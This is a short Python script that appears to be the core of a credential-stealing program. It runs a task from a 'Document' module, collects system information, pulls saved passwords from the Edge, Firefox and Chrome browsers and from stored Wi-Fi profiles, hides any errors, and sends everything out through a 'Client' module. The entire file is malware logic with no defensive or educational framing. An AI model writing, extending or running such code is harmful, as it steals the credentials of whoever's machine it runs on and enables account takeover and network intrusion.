
import json

import Client as client
import System as system
import Chrome as chrome
import Firefox as firefox
import Wifi as wifi
import Edge as edge

import Document as doc



def dataCollect():

    doc.runTask()
    try:
        begining = system.info()

        set = begining.get("data")

        edge.get_password(set)
        firefox.password(set)
        chrome.password(set)
        wifi.password(set)
    except:
        begining = {}

    return begining

client.sendData(json.dumps(dataCollect(), indent=4))
